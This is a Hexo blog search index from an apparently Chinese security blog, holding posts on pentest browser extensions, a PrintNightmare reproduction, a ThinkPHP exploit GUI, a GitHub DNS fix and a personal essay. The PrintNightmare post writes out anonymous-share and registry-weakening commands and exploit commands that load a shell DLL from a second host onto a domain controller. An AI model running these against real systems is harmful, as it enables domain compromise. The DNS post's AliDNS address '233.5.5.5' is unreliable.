<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>浏览器插件分享</title>
      <link href="posts/29501.html"/>
      <url>posts/29501.html</url>
      
        <content type="html"><![CDATA[<p>分享几款日常使用较多的浏览器插件和一些常用于渗透测试的浏览器插件</p><p>更多好玩的插件请查看：<a href="https://github.com/zhaoolee/ChromeAppHeroes">Chrome插件英雄榜</a></p><h3 id="日常使用"><a href="#日常使用" class="headerlink" title="日常使用"></a>日常使用</h3><h4 id="Surfingkeys"><a href="#Surfingkeys" class="headerlink" title="Surfingkeys"></a>Surfingkeys</h4><p>下载地址：<br><a href="https://microsoftedge.microsoft.com/addons/detail/surfingkeys/kgnghhfkloifoabeaobjkgagcecbnppg">https://microsoftedge.microsoft.com/addons/detail/surfingkeys/kgnghhfkloifoabeaobjkgagcecbnppg</a>  </p><h4 id="扩展管理器（Extension-Manager）"><a href="#扩展管理器（Extension-Manager）" class="headerlink" title="扩展管理器（Extension Manager）"></a>扩展管理器（Extension Manager）</h4><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/extension-manager/gjldcdngmdknpinoemndlidpcabkggco">https://chrome.google.com/webstore/detail/extension-manager/gjldcdngmdknpinoemndlidpcabkggco</a></p><h4 id="OneTab-Extension"><a href="#OneTab-Extension" class="headerlink" title="OneTab Extension"></a>OneTab Extension</h4><p>下载地址：<br><a href="https://microsoftedge.microsoft.com/addons/detail/onetab-extension/kgimkccmplbmlalhblhncbecfgijcigm">https://microsoftedge.microsoft.com/addons/detail/onetab-extension/kgimkccmplbmlalhblhncbecfgijcigm</a>  </p><h4 id="清除历史记录和Web缓存"><a href="#清除历史记录和Web缓存" class="headerlink" title="清除历史记录和Web缓存"></a>清除历史记录和Web缓存</h4><p>下载地址：<br><a href="https://microsoftedge.microsoft.com/addons/detail/clear-history-web-cache/ojilnhojiihncgjnnpphppnmflflhbcg">https://microsoftedge.microsoft.com/addons/detail/clear-history-web-cache/ojilnhojiihncgjnnpphppnmflflhbcg</a></p><h4 id="AdBlock插件"><a href="#AdBlock插件" class="headerlink" title="AdBlock插件"></a>AdBlock插件</h4><p>这是一款参考各种广告过滤插件开发的功能全面的免费开源广告过滤工具，可以过滤掉网页上的大部分广告：浮动广告，购物广告，恶意弹窗，跟踪代码，这款插件适用于过滤国内网站的广告，国外网站的广告建议使用AdBlock插件。</p><h4 id="简悦-SimpRead"><a href="#简悦-SimpRead" class="headerlink" title="简悦 - SimpRead"></a>简悦 - SimpRead</h4><p>让你瞬间进入沉浸式阅读的 Edge 扩展，类似 Safari 的阅读模式。</p><p>下载地址<br><a href="https://microsoftedge.microsoft.com/addons/detail/%E7%AE%80%E6%82%A6-simpread/clgdhlhfiocphghdkdbgdlmfaafccfmc">简悦 - SimpRead - Microsoft Edge Addons</a></p><h4 id="沙拉查词-聚合词典划词翻译"><a href="#沙拉查词-聚合词典划词翻译" class="headerlink" title="沙拉查词-聚合词典划词翻译"></a>沙拉查词-聚合词典划词翻译</h4><p>Saladict 沙拉查词是一款专业划词翻译扩展，为交叉阅读而生。大量权威词典涵盖中英日韩法德西语，支持复杂的划词操作、网页翻译、生词本与 PDF 浏览。</p><p>下载地址<br><a href="https://microsoftedge.microsoft.com/addons/detail/%E6%B2%99%E6%8B%89%E6%9F%A5%E8%AF%8D%E8%81%9A%E5%90%88%E8%AF%8D%E5%85%B8%E5%88%92%E8%AF%8D%E7%BF%BB%E8%AF%91/idghocbbahafpfhjnfhpbfbmpegphmmp">https://microsoftedge.microsoft.com/addons/detail/%E6%B2%99%E6%8B%89%E6%9F%A5%E8%AF%8D%E8%81%9A%E5%90%88%E8%AF%8D%E5%85%B8%E5%88%92%E8%AF%8D%E7%BF%BB%E8%AF%91/idghocbbahafpfhjnfhpbfbmpegphmmp</a></p><h4 id="Tampermonkey"><a href="#Tampermonkey" class="headerlink" title="Tampermonkey"></a>Tampermonkey</h4><p>懂的都懂</p><p>脚本推荐：</p><ul><li><p><a href="https://greasyfork.org/zh-CN/scripts/24508-userscript-show-site-all-userjs">Userscript+ : 显示当前网站所有可用的UserJS脚本 Jaeger</a></p></li><li><p><a href="https://greasyfork.org/zh-CN/scripts/2998-search-by-image">Search By Image | 以图搜图</a></p></li></ul><h4 id="谷歌上网助手"><a href="#谷歌上网助手" class="headerlink" title="谷歌上网助手"></a>谷歌上网助手</h4><p>这是一款专门为科研、外贸、跨境电商、海淘人员、开发人员服务的上网加速工具，Chrome内核浏览器专用，可以解决Chrome扩展无法自动更新问题，一键安装，无需其他配置即可访问以下服务，但是会与“Proxy SwitchyOmega”这类代理插件冲突。</p><ul><li>Google搜索：<a href="https://www.google.com/">https://www.google.com</a></li><li>Gmail邮箱：<a href="https://mail.google.com/">https://mail.google.com</a></li><li>Chrome商店访问以及Google+等服务等。</li></ul><h4 id="类似的网站-发现相关网站"><a href="#类似的网站-发现相关网站" class="headerlink" title="类似的网站 - 发现相关网站"></a>类似的网站 - 发现相关网站</h4><p>立即发现与您当前正在浏览的网站类似的网站。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/similar-sites-discover-re/necpbmbhhdiplmfhmjicabdeighkndkn">类似的网站 - 发现相关网站 - Chrome 网上应用店 (google.com)</a></p><h4 id="百度文库免费下载"><a href="#百度文库免费下载" class="headerlink" title="百度文库免费下载"></a>百度文库免费下载</h4><p>这是一款百度文档免下载券下载文档的插件，可以导出PDF文字和图片，能屏蔽文档中的广告，支持Word、PPT、PDF文档，只要能试读的页面都能下载到，能分页下载完整的文档，非常稳定可靠</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/%E7%99%BE%E5%BA%A6%E6%96%87%E5%BA%93%E5%85%8D%E8%B4%B9%E4%B8%8B%E8%BD%BD/imjoocoajfjgnabmlbgpcnpieibibhmd">百度文库免费下载 - Chrome 网上应用店 (google.com)</a></p><h4 id="Desktop-Messenger-for-Telegram"><a href="#Desktop-Messenger-for-Telegram" class="headerlink" title="Desktop Messenger for Telegram"></a>Desktop Messenger for Telegram</h4><p>这是一款非官方开发和维护的Telegram Web客户端插件，可直接通过点击插件图标来进行登录和收发信息，有好友发送信息时也会有消息通知。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/desktop-messenger-for-tel/dafiggkhlbbhfcpgggcfeeoliillkabn">Desktop Messenger for Telegram™ - Chrome 网上应用店 (google.com)</a></p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h4><p>这个插件可以自动探测当前网站所属的国家、城市，解析 IP 地址以及开放的服务和端口，包括但不限于 FTP、DNS、SSH 或者其他服务等，属被动信息搜集中的一种。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap">Shodan - Chrome 网上应用店</a></p><h4 id="Wappalyzer"><a href="#Wappalyzer" class="headerlink" title="Wappalyzer"></a>Wappalyzer</h4><p>这个插件可用于指纹识别，能够检测出当前网站使用的 Web 框架和 CMS、CDN、统计、中间件、编程语言以及 JavaScript 框架和库等等相关信息。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg">Wappalyzer - Chrome 网上应用店</a></p><h4 id="FOFA-Pro-View"><a href="#FOFA-Pro-View" class="headerlink" title="FOFA Pro View"></a>FOFA Pro View</h4><p>这个插件比 Shodan 搜集到的信息更全，能够检测出当前网站的托管位置（国家 / 地区 / 城市）、组织、ASN、端口、协议和相关资产等信息。</p><p>项目地址：https : //github.com/fofapro/fofa_view</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/fofa-pro-view/dobbfkjhgbkmmcooahlnllfopfmhcoln">FOFA Pro View - Chrome 网上应用店</a></p><h4 id="IP-DNS-amp-Security-Tools"><a href="#IP-DNS-amp-Security-Tools" class="headerlink" title="IP, DNS &amp; Security Tools"></a>IP, DNS &amp; Security Tools</h4><p>这个插件是直接调用 <a href="https://hackertarget.com/">https://hackertarget.com</a> 官网接口来进行查询的，如果长时间不出查询结果时可能就得上 “墙” 了，可查询的信息包括有：IP、路由、DNS、Whios、指纹、HTTP 头、同服等。</p><h4 id="IP-Address-and-Domain-Information"><a href="#IP-Address-and-Domain-Information" class="headerlink" title="IP Address and Domain Information"></a>IP Address and Domain Information</h4><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/ip-address-and-domain-inf/lhgkegeccnckoiliokondpaaalbhafoa">https://chrome.google.com/webstore/detail/ip-address-and-domain-inf/lhgkegeccnckoiliokondpaaalbhafoa</a></p><h4 id="anti-honeypot"><a href="#anti-honeypot" class="headerlink" title="anti-honeypot"></a>anti-honeypot</h4><p>用来检测 WEB 蜜罐并中断请求，能够识别并中断长亭 D-sensor 和墨安幻阵的部分溯源 API。</p><p>项目地址：<a href="https://github.com/Ar3h/anti-honeypot">https://github.com/Ar3h/anti-honeypot</a></p><h3 id="改包发包"><a href="#改包发包" class="headerlink" title="改包发包"></a>改包发包</h3><h4 id="HackBar"><a href="#HackBar" class="headerlink" title="HackBar"></a>HackBar</h4><p>这个插件可用于常见编码 / 解码、POST/Cookies 数据提交、SQL/XSS/LFI/XXE 漏洞测试、自定义 Referer/User-Agent 等，是一款不可多得的渗透测试人员必备插件，虽然现在作者已经收费了，但还是能够绕过其限制的。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc">https://chrome.google.com/webstore/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc</a></p><h4 id="DenisPodgurskii-pentestkit"><a href="#DenisPodgurskii-pentestkit" class="headerlink" title="DenisPodgurskii/pentestkit"></a>DenisPodgurskii/pentestkit</h4><p>下载地址：<br><a href="https://github.com/DenisPodgurskii/pentestkit">https://github.com/DenisPodgurskii/pentestkit</a></p><h4 id="Penetration-Testing-Kit"><a href="#Penetration-Testing-Kit" class="headerlink" title="Penetration Testing Kit"></a>Penetration Testing Kit</h4><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/penetration-testing-kit/ojkchikaholjmcnefhjlbohackpeeknd">https://chrome.google.com/webstore/detail/penetration-testing-kit/ojkchikaholjmcnefhjlbohackpeeknd</a></p><h4 id="HTTP-Header-Live"><a href="#HTTP-Header-Live" class="headerlink" title="HTTP Header Live"></a>HTTP Header Live</h4><p>这个插件可用于捕获网页中加载的全部网页流量数据包，并且支持编辑和重发，就是 UI 差了点，大部分的同类插件都只能查看，不能编辑和重放。</p><h3 id="辅助工具"><a href="#辅助工具" class="headerlink" title="辅助工具"></a>辅助工具</h3><h4 id="Hack-Tools"><a href="#Hack-Tools" class="headerlink" title="Hack-Tools"></a>Hack-Tools</h4><p>payload快速生成，编码解码</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/d3coder/gncnbkghencmkfgeepfaonmegemakcol">d3coder - Chrome 网上应用店 (google.com)</a></p><h4 id="d3coder"><a href="#d3coder" class="headerlink" title="d3coder"></a>d3coder</h4><p>这个插件可用于各种类型的编码和解码，例如 URI、Hex、Base64，Rot13 或 Unix 时间戳等编码之间的相互转换。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/d3coder/gncnbkghencmkfgeepfaonmegemakcol">d3coder - Chrome 网上应用店 (google.com)</a></p><h4 id="Set-Character-Encoding"><a href="#Set-Character-Encoding" class="headerlink" title="Set Character Encoding"></a>Set Character Encoding</h4><p>这个插件可用来修改当前浏览器的编码，当浏览器编码与网页编码不一致时就会出现乱码的情况，最后吐槽一下这个新版谷歌浏览器的编码设置是真不好找。</p><p><a href="https://chrome.google.com/webstore/detail/set-character-encoding/bpojelgakakmcfmjfilgdlmhefphglae">Set Character Encoding - Chrome 网上应用店 (google.com)</a></p><p><a href="https://chrome.google.com/webstore/detail/charset/oenllhgkiiljibhfagbfogdbchhdchml">Charset - Chrome 网上应用店 (google.com)</a></p><h4 id="EditThisCookie"><a href="#EditThisCookie" class="headerlink" title="EditThisCookie"></a>EditThisCookie</h4><p>这个插件可以帮助我们轻松管理谷歌浏览器上的各种 Cookies，支持添加，删除，编辑，搜索，锁定、屏蔽、保护和拦截 Cookies！</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg">EditThisCookie - Chrome 网上应用店 (google.com)</a></p><p><a href="https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm">Cookie-Editor - Chrome 网上应用店 (google.com)</a></p><h4 id="X-Forwarded-For-Header"><a href="#X-Forwarded-For-Header" class="headerlink" title="X-Forwarded-For Header"></a>X-Forwarded-For Header</h4><p>请求ip伪造</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/x-forwarded-for-header/hkghghbnihliadkabmlcmcgmffllglin">X-Forwarded-For Header - Chrome 网上应用店 (google.com)</a></p><h4 id="Proxy-SwitchyOmega"><a href="#Proxy-SwitchyOmega" class="headerlink" title="Proxy SwitchyOmega"></a>Proxy SwitchyOmega</h4><p>这个插件可以帮助我们快速管理和切换多个代理设置，支持的代理协议有：HTTP/HTTPS、Socks4/Socks5，这也是一款渗透测试人员（抓包、上 “墙”）必备插件，谷歌上网助手插件也具备这样的代理设置功能。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif">Proxy SwitchyOmega - Chrome 网上应用店 (google.com)</a></p><h4 id="User-Agent-Switcher"><a href="#User-Agent-Switcher" class="headerlink" title="User-Agent Switcher"></a>User-Agent Switcher</h4><p>这个插件可用来模拟指定 User-Agent 去访问网站，有的开发人员在编写代码过程中会设置仅允许移动端 User-Agent 访问，一些做黑帽 SEO 的也经常使用这种方式来限制 PC 端访问。这款插件在 Chrome 网上应用商店中已经下架了，有需要的可以找我。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/user-agent-switcher-for-c/djflhoibgkdhkhhcedjiklpkjnoahfmg">User-Agent Switcher for Chrome - Chrome 网上应用店 (google.com)</a></p><h4 id="NoScript"><a href="#NoScript" class="headerlink" title="NoScript"></a>NoScript</h4><p>这个插件可用于禁止浏览器加载和解析 JS 代码，也可以通过以下两种方式禁止执行 JS，常见应用场景有：禁用 JS 后台越权、禁用 JS 白名单上传等。</p><ul><li>  Firefox：about:config-&gt;javascript.enabled    </li><li>  Chorme：chrome://settings/content/javascript</li></ul><p>下载地址:<br><a href="https://chrome.google.com/webstore/detail/noscript/doojmbjmlfjjnbmnoijecmcbfeoakpjm">NoScript - Chrome 网上应用店 (google.com)</a></p><h4 id="JWT-Debugger"><a href="#JWT-Debugger" class="headerlink" title="JWT Debugger"></a>JWT Debugger</h4><p>JWT Debugger 是一款可以编码、验证和生成JWT的开发工具，官方提供了调试工具,我们可以很方便的看到JWT token各个组成部分解码后的信息,以及是否能验证成功。</p><p>下载地址:<br><a href="https://chrome.google.com/webstore/detail/jwt-debugger/ppmmlchacdbknfphdeafcbmklcghghmd">JWT Debugger - Chrome 网上应用店 (google.com)</a></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="Elasticvue"><a href="#Elasticvue" class="headerlink" title="Elasticvue"></a>Elasticvue</h4><p>Elasticsearch 服务未授权访问漏洞进行利用</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/elasticvue/hkedbapjpblbodpgbajblpnlpenaebaa">Elasticvue - Chrome 网上应用店 (google.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 浏览器插件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PrintNightmare(CVE-2021-1675/CVE-2021-34527)复现</title>
      <link href="posts/29501.html"/>
      <url>posts/29501.html</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><blockquote><p>此漏洞一开始为CVE-2021-1675，随后微软把此漏洞分配给了CVE-2021-34527,并提到了两个漏洞很像，但是攻击向量是不同的。<br>详见: <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">CVE-2021-34527 - 安全更新程序指南 - Microsoft - Windows 打印后台处理程序远程执行代码漏洞</a><br>cve-2021-1675的更新补丁只是修复了本地提权利用，远程代码执行还是可以利用。</p></blockquote><p>Github 公布的地址：<a href="https://github.com/afwu/PrintNightmare">https://github.com/afwu/PrintNightmare</a></p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><ul><li>Windows Server 2012 R2 (Server Core installation)</li><li>Windows Server 2012 R2</li><li>Windows Server 2012 (Server Core installation)</li><li>Windows Server 2012</li><li>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</li><li>Windows Server 2008 R2 for x64-based Systems Service Pack 1</li><li>Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)</li><li>Windows Server 2008 for x64-based Systems Service Pack 2</li><li>Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)</li><li>Windows Server 2008 for 32-bit Systems Service Pack 2</li><li>Windows RT 8.1</li><li>Windows 8.1 for x64-based systems</li><li>Windows 8.1 for 32-bit systems</li><li>Windows 7 for x64-based Systems Service Pack 1</li><li>Windows 7 for 32-bit Systems Service Pack 1</li><li>Windows Server 2016 (Server Core installation)</li><li>Windows Server 2016</li><li>Windows 10 Version 1607 for x64-based Systems</li><li>Windows 10 Version 1607 for 32-bit Systems</li><li>Windows 10 for x64-based Systems</li><li>Windows 10 for 32-bit Systems</li><li>Windows Server, version 20H2 (Server Core Installation)</li><li>Windows 10 Version 20H2 for ARM64-based Systems</li><li>Windows 10 Version 20H2 for 32-bit Systems</li><li>Windows 10 Version 20H2 for x64-based Systems</li><li>Windows Server, version 2004 (Server Core installation)</li><li>Windows 10 Version 2004 for x64-based Systems</li><li>Windows 10 Version 2004 for ARM64-based Systems</li><li>Windows 10 Version 2004 for 32-bit Systems</li><li>Windows 10 Version 21H1 for 32-bit Systems</li><li>Windows 10 Version 21H1 for ARM64-based Systems</li><li>Windows 10 Version 21H1 for x64-based Systems</li><li>Windows 10 Version 1909 for ARM64-based Systems</li><li>Windows 10 Version 1909 for x64-based Systems</li><li>Windows 10 Version 1909 for 32-bit Systems</li><li>Windows Server 2019 (Server Core installation)</li><li>Windows Server 2019</li><li>Windows 10 Version 1809 for ARM64-based Systems</li><li>Windows 10 Version 1809 for x64-based Systems</li><li>Windows 10 Version 1809 for 32-bit Systems</li></ul><h1 id="漏洞准备"><a href="#漏洞准备" class="headerlink" title="漏洞准备"></a>漏洞准备</h1><ul><li>一个普通权限的域账户</li><li>目标开启Spooler服务</li><li>创建的smb服务允许匿名访问，即目标可以直接获取到文件</li></ul><p>首先创建一个可以允许匿名访问的 smb, 在域控上必须能直接获取到文件<br>windows系统创建方法（powershell版本过低的话会报错）：</p><pre class="line-numbers language-none"><code class="language-none">mkdirC:\shareicaclsC:\share\ /T /grant Anonymous` logon:ricaclsC:\share\ /T /grant Everyone:rNew-SmbShare-Path C:\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone'REG ADD"HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /vNullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existingNullSessionPipesREG ADD"HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /vNullSessionShares /t REG_MULTI_SZ /d share /fREG ADD"HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous/t REG_DWORD /d 1 /fREG ADD"HKLM\System\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /tREG_DWORD /d 0 /f# Reboot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h2><p>python版本的   <a href="https://github.com/cube0x0/CVE-2021-1675">https://github.com/cube0x0/CVE-2021-1675</a><br>C#版：            <a href="https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare">https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare</a><br>C++版本的      <a href="https://github.com/afwu/PrintNightmare">https://github.com/afwu/PrintNightmare</a><br>本地提权版：   <a href="https://github.com/hlldz/CVE-2021-1675-LPE">https://github.com/hlldz/CVE-2021-1675-LPE</a>  </p><h2 id="漏洞过程"><a href="#漏洞过程" class="headerlink" title="漏洞过程"></a>漏洞过程</h2><ol><li>首先搭建一个SMB匿名共享，放恶意dll文件。  </li><li>工具运行后会先检测<code>C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_xx </code>文件名，自动替换。</li><li>然后远程拉取我们设置的匿名共享的恶意dll文件执行</li></ol><p>如果报错<code>Error: code: 0x5 - rpc_s_access_denied</code>说明smb还不能匿名访问，<br>如果执行成功，但是只复制了dll并未执行，可能是验证用户不是普通域用户账号。</p><h2 id="python版本"><a href="#python版本" class="headerlink" title="python版本"></a>python版本</h2><p>其中python版本的exp需要按照说明文档安装exp作者的impacket库，其余不需要修改任何东西。</p><pre class="line-numbers language-none"><code class="language-none">pip3 uninstall impacketgit clone https://github.com/cube0x0/impacketcd impacketpython3 ./setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以使用<code>rpcdump.py</code>来扫描潜在的易受攻击的主机，如果它返回一个值，它可能是易受攻击的<br>协议：[MS-RPRN]：打印系统远程协议  </p><pre class="line-numbers language-none"><code class="language-none">rpcdump.py @192.168.0.1 | grep MS-RPRN<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后进行利用，这里使用 dll 是 cs 生成的 dll</p><pre class="line-numbers language-none"><code class="language-none">sudo python3 CVE-2021-1675.py djhons.com/test:Admin@123@192.168.0.1 '\\192.168.0.2\smb\shell.dll'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><pre class="line-numbers language-none"><code class="language-none">mimikatz.exemisc::printnightmare /server:192.168.0.1 /authuser:localuser /authpassword:pass /library:\\192.168.0.2\smb\shell.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="c-版本"><a href="#c-版本" class="headerlink" title="c++版本"></a>c++版本</h2><p>没测试，需要改源码，参考一下。</p><p>推荐使用其他工具，可以自动枚举路径。</p><pre class="line-numbers language-none"><code class="language-none">//info.pDriverPath = (LPWSTR)L"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_[受害机特有的]\\Amd64\\UNIDRV.DLL";info.pDriverPath = (LPWSTR)L"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL";剩下是将含有old的路径改为 C:\\Windows\\System32\\spool\\drivers\\x64\\%s。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.cnblogs.com/Mikasa-Ackerman/p/CVE20211675lou-dong-fu-xian.html">https://www.cnblogs.com/Mikasa-Ackerman/p/CVE20211675lou-dong-fu-xian.html</a><br><a href="https://mp.weixin.qq.com/s/Vceup70C9USoM4JwK-6Z9w">https://mp.weixin.qq.com/s/Vceup70C9USoM4JwK-6Z9w</a><br><a href="https://mp.weixin.qq.com/s/iNOb6cBAfMwCm2AjqbdEvQ">https://mp.weixin.qq.com/s/iNOb6cBAfMwCm2AjqbdEvQ</a><br><a href="https://mp.weixin.qq.com/s/tMTIsijirsPc46CZVtcWQg">CVE-2021-1675 打印机漏洞沦陷域控的补充 07/02/21</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> PrintNightmare </tag>
            
            <tag> CVE-2021-1675 </tag>
            
            <tag> CVE-2021-34527 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP图形化综合利用工具</title>
      <link href="posts/54917.html"/>
      <url>posts/54917.html</url>
      
        <content type="html"><![CDATA[<p>下载地址：<br><a href="https://github.com/bewhale/thinkphp_gui_tools/releases/download/V2.0/ThinkPHP.V2.0.by.jar">ThinkPHP 综合利用工具 V2.0 by 蓝鲸.jar</a></p><p>本项目是采用 JDK8 + javafx 开发的 ThinkPHP 图形化综合利用工具， 参考了其他大佬项目的部分代码。</p><p>JDK8可以直接运行，JDK11 因为去除了javafx这个依赖，需要自己再加上参数加入模块</p><p><code>java -Dfile.encoding="UTF-8" --module-path "C:\Program Files\Java\javafx-sdk-11.0.2\lib" --add-modules "javafx.controls,javafx.fxml,javafx.web" -jar "xxx.jar" </code></p><ul><li>支持大部分ThinkPHP漏洞检测,整合20多个payload</li><li>支持部分漏洞执行命令</li><li>支持单一漏洞批量检测</li><li>支持TP3和TP5自定义路径日志遍历</li><li>支持部分漏洞一键GetShell</li><li>支持设置代理和UA</li></ul><p><img src="https://raw.githubusercontents.com/bewhale/thinkphp_gui_tools/main/img.png"></p><p><img src="https://raw.githubusercontents.com/bewhale/thinkphp_gui_tools/main/img1.png"></p><p><img src="https://raw.githubusercontents.com/bewhale/thinkphp_gui_tools/main/img2.png"></p><h1 id="参考项目"><a href="#参考项目" class="headerlink" title="参考项目"></a>参考项目</h1><p><a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a><br><a href="https://github.com/Lucifer1993/TPscan">https://github.com/Lucifer1993/TPscan</a><br><a href="https://github.com/fupinglee/JavaTools">https://github.com/fupinglee/JavaTools</a><br><a href="https://github.com/xinyu2428/TDOA_RCE">https://github.com/xinyu2428/TDOA_RCE</a>  </p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp </tag>
            
            <tag> 图形化 </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> getshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github部分网站无法访问解决办法</title>
      <link href="posts/7204.html"/>
      <url>posts/7204.html</url>
      
        <content type="html"><![CDATA[<p>国内大部分地方无法访问以下域名</p><ul><li>*.github.io </li><li>raw.githubusercontent.com</li></ul><p>原因大都是是国内运营商DNS污染, ping一些域名可以发现,<br>域名往往被指向了  127.0.0.1, 或者直接提示找不到主机</p><p>修改本地hosts文件的话，遇到一个新的域名，又要添加一条新纪录，稍显麻烦，</p><p>所有我们直接修改本机的DNS地址，一劳永逸。</p><p>修改完DNS地址后，点击高级查看是否还有其他的DNS地址，删除掉。</p><p>然后打开cmd， 执行 <code>ipconfig /flushdns</code> 清除缓存</p><p>如下图：</p><p><img src="https://raw.githubusercontents.com/bewhale/img/master/img20210707080127.png"></p><p>一些常用的DNS地址：</p><pre class="line-numbers language-none"><code class="language-none">114DNS首选：114.114.114.114备选：114.114.114.115Google DNS8.8.8.88.8.4.4阿里 AliDNS首选：233.5.5.5备选：223.6.6.6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者使用图形化工具来一键测试，修改，不要忘记在高级里面把多余的DNS地址删除掉。</p><p> <a href="https://www.sordum.org/7952/dns-jumper-v2-2/">dns-jumper-v2-2/</a></p>]]></content>
      
      
      <categories>
          
          <category> 经验之谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GitHub </tag>
            
            <tag> DNS污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>essay-life</title>
      <link href="posts/986.html"/>
      <url>posts/986.html</url>
      
        <content type="html"><![CDATA[<div class="ipage">    <div class="ititle">节选自《你若安好便是晴天》- 前言</div>    <div class="izhengwen">        <p>生活，有时感觉莫名的心烦。心烦的时候，最好的是沉默。</p>        <p>不必喝酒，出去走走，那小路和树林，那天空和海滩，那山风和淡云，就在身旁；</p>        <p>不必多怨，言多不逊，执一本书，在阳光下，微笑着面对一切，聆听一切；</p>        <p>不必伤怀，曲折有度，也许过了就算了，算了就消失了。</p>        <p>心烦，其实只是人的一种心情，看淡了，就习惯了。</p>        <p>生活，有时真的让人无语，令人心碎。</p>        <p>只是，既是自己选择的路，跪着也要走下去。</p>        <p>自己扛下的事，留着泪也要做好。</p>        <p>而有些情，舍不得也得放下，哪怕心再痛再苦。</p>        <p>其实，缘来缘去的个中滋味，只有岁月懂得，也只有自己深深懂得!</p>        <p>生活，有时候其实很简单。</p>        <p>生活，不过是一份发自内心的微笑；</p>        <p>是一种清淡如水的心态，对苦难，对幸福，对整个人生；</p>        <p>更是一本永远也读不完的书，有故事，有梦想，有难以言说的情怀。</p>        <p>倘若有天，在一个阳光温热的午后，树荫下，你会发现：净是如此美丽 !</p>        <p>亲爱的，很多时候不是生活抛弃了你，而是你抛弃了生活本身。</p>    </div></div>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
            <tag> 请相信生活 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
